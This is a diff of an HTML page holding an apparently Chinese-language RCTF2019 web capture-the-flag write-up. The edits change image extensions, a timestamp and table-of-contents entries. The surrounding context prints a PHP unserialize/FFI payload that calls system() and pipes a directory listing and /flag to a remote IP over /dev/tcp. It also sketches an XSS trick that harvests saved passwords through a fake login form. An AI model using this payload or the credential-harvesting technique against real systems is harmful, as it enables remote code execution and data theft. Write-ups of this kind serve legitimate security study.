@@ -91,11 +91,11 @@
 <meta property="og:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/f1abee1cbb6881710dafe1de7e4a2714.png">
 <meta property="og:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/5d2fa85def950ff15e0099624e63538c.png">
 <meta property="og:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/804e4b8b15bf0bc108d071d1b8a48297.png">
-<meta property="og:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/693eba1af7411d85ee572541680a6443.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/693eba1af7411d85ee572541680a6443.jpg">
 <meta property="og:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/7e6b6c53be81dd685cbc541c61bc728d.png">
 <meta property="og:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/fc12c4d5ce09aa94cac0810e8791b882.png">
 <meta property="og:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/f63f7f702d11ef2b49decaa46e001ff4.png">
-<meta property="og:updated_time" content="2019-08-01T15:44:21.683Z">
+<meta property="og:updated_time" content="2019-08-01T16:06:43.272Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="RCTF2019 web wp">
 <meta name="twitter:description" content="复现这个环境真的要命，真的是整几天docker做一天题Orz">
@@ -335,7 +335,7 @@
 <p>于是payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unserialize(&apos;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&apos;)-&gt;__get(&apos;ret&apos;)-&gt;system(&apos;bash -c &quot;cd ../../../../../../../;ls -l &gt; /dev/tcp/ip/port&quot;&apos;);</span><br><span class="line"></span><br><span class="line">unserialize(&apos;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&apos;)-&gt;__get(&apos;ret&apos;)-&gt;system(&apos;bash -c &quot;cat /flag &gt; /dev/tcp/119.23.206.8/2333&quot;&apos;);</span><br></pre></td></tr></table></figure></p>
 <p>获得目录与flag</p>
 <p><img src="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/804e4b8b15bf0bc108d071d1b8a48297.png" alt=""></p>
-<p><img src="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/693eba1af7411d85ee572541680a6443.png" alt=""></p>
+<p><img src="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/693eba1af7411d85ee572541680a6443.jpg" alt=""></p>
 <h2 id="jail"><a href="#jail" class="headerlink" title="jail"></a>jail</h2><p>这是一道很有趣的XSS的题，有好几种解法。可惜复现时bot好像启用失败，只能写写大致的思路了</p>
 <p>首先登录进入，整一下就会发现有两个可用的接口。<code>?action=profile</code>用于上传文件，不过php和html都被限制了。另一个接口<code>?action=post</code>一看就是搞XSS的</p>
 <p>试着写个<code>&lt;img src=&quot;https://www.baidu.com&quot;&gt;</code>，发现并没有加载，开一下控制台看看发现</p>
@@ -369,7 +369,7 @@
 <p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-DNS-Prefetch-Control" target="_blank" rel="noopener">X-DNS-Prefetch-Control
 </a></p>
 <p>emmm…有时间我再整整这个</p>
-<p>3.password<br>这题和上一题是同样的环境，于是还是只能写写思路</p>
+<h2 id="password"><a href="#password" class="headerlink" title="password"></a>password</h2><p>这题和上一题是同样的环境，于是还是只能写写思路</p>
 <p>给了三个提示，第一个打密码，第二个是说不是chrome自带的密码管理，第三个是说获取html源码</p>
 <p>那猜测大概是某种chrome插件管理密码，然后由于输入密码时会下拉框加载先前输入过的密码。于是我们可以通过XSS构造一个登录框，把所有保存的该站的密码给拿到。这可真是个斯巴拉西的操作</p>
 <p>于是先按hint写一个登录框抓源码</p>
@@ -641,7 +641,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#nextphp"><span class="nav-number">1.</span> <span class="nav-text">nextphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jail"><span class="nav-number">2.</span> <span class="nav-text">jail</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#calcalcalc"><span class="nav-number">3.</span> <span class="nav-text">calcalcalc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rblog2019"><span class="nav-number">4.</span> <span class="nav-text">rblog2019</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez4cr"><span class="nav-number">5.</span> <span class="nav-text">ez4cr</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#nextphp"><span class="nav-number">1.</span> <span class="nav-text">nextphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jail"><span class="nav-number">2.</span> <span class="nav-text">jail</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#password"><span class="nav-number">3.</span> <span class="nav-text">password</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#calcalcalc"><span class="nav-number">4.</span> <span class="nav-text">calcalcalc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rblog2019"><span class="nav-number">5.</span> <span class="nav-text">rblog2019</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez4cr"><span class="nav-number">6.</span> <span class="nav-text">ez4cr</span></a></li></ol></div>
             
 
           </div>
